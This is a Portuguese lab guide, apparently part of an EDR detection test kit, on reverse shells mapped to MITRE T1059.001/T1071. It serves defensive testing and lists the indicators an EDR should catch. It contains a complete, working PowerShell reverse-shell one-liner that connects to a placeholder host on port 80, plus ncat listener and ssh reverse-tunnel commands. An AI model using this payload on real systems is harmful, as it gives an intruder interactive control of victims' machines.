# 06. Shell Reversa (controle remoto)

**Tatica MITRE ATT&CK:** Command and Control
**IDs:** T1059.001, T1071
**Severidade esperada:** Critica
**Precisa de admin:** Nao
**Destrutivo:** Nao

## Para que serve, na visao do atacante

Normalmente e voce quem se conecta a um servidor. A shell reversa inverte isso. A maquina da vitima e que liga para a casa do atacante e entrega a ele um terminal de comandos. A partir dai o invasor digita comandos como se estivesse sentado na frente do computador, de forma interativa e em tempo real.

## Por que e perigoso

E o momento em que a vitima perde o controle da maquina. E e esperto. Como e a maquina interna que sai conectando, geralmente pela porta 80, de web comum, ela atravessa o firewall. A maioria libera a saida pela 80 sem questionar. Por isso a deteccao dessa fase costuma ser o alerta mais valioso de todo o teste.

## Analogia

Imagine que o interfone da sua casa, em vez de so tocar, ligasse sozinho para o ladrao e abrisse um microfone e um comando da casa inteira para ele. E ele ligou de dentro para fora, para nao parecer invasao.

## O que o script faz

O script pede o IP do seu servidor, a maquina ouvinte, e abre uma conexao a partir do powershell.exe nativo, entregando um prompt. Tudo acontece dentro do seu laboratorio, entre duas maquinas suas.

### Importante, o outro lado precisa de um ouvinte

Um servidor SSH na porta 80 nao captura uma shell reversa crua. No seu servidor, escolha uma das opcoes.

Opcao A, ouvinte simples. Pare o SSH e rode um listener na porta 80.

```bash
ncat -lvnp 80
```

Opcao B, so ferramentas nativas do Windows, com tunel SSH. O Windows 10 e 11 ja trazem o cliente ssh.exe. Da para usar o seu servidor SSH de verdade na porta 80 para abrir um tunel reverso.

```cmd
ssh -p 80 -R 9001:127.0.0.1:3389 usuario@SEU_IP
```

## Exemplo com PowerShell nativo, troque SEU_IP

```powershell
$c=New-Object System.Net.Sockets.TCPClient('SEU_IP',80);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

## O que o EDR deve detectar

* O powershell.exe abrindo conexao de rede de saida incomum.
* Uso de New-Object System.Net.Sockets.TCPClient e Invoke-Expression.
* Comportamento de Command and Control, severidade critica.

## Pre requisitos

* Uma segunda maquina ou VM sua como ouvinte, veja as opcoes acima.
* Rede entre as duas VMs do laboratorio.

## Limpeza

* Feche a janela do PowerShell ou encerre o ssh. Nenhum arquivo e deixado no disco.
